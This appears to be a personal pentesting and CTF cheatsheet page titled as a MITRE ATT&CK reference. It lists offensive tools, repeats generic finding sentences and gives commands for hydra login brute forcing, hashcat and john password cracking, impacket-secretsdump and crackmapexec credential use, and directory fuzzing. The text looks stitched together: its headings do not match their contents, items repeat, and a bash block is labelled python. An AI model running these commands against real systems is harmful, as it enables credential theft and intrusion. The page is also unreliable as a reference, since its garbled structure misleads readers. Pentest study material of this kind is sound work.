---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, privilege escalation, persistence, malware, windows"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-120.html"
URL_IMAGES: ""
Date: "2026-01-14"
Tags: "Cheatsheet, Privilege Escalation, Persistence, Malware, Windows"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-120"
Permalink: "/notes/note-mitre-att&ck-framework-reference-120.html"
BtnLabel: "Read Notes"
Pick: 0
---
## smbexec

### Drupal

- `CORS Misconfiguration`
- `GetUserSPNs`
- `secretsdump`
- `nmap`
- `GPP Password`
- `rubeus`

- `CSRF`
- `ldapsearch`
- `psexec`
- `Subdomain Takeover`
- `smbexec`
- `hashcat`

- `netcat`
- `burpsuite`
- `Subdomain Takeover`
- `NFS No Root Squash`
- `SQL Injection`

## SNMP

### Nginx

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.6.202 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.222.207 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.95.251 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.171.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## chisel

### netcat

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.253.62
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.29.5/FUZZ
gobuster dir -u http://10.96.98.162/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
nmap -sCV -p1433,23,27017 10.87.177.192 -oN scan.txt
crackmapexec smb 10.95.88.127 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.121.101.243
```

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.
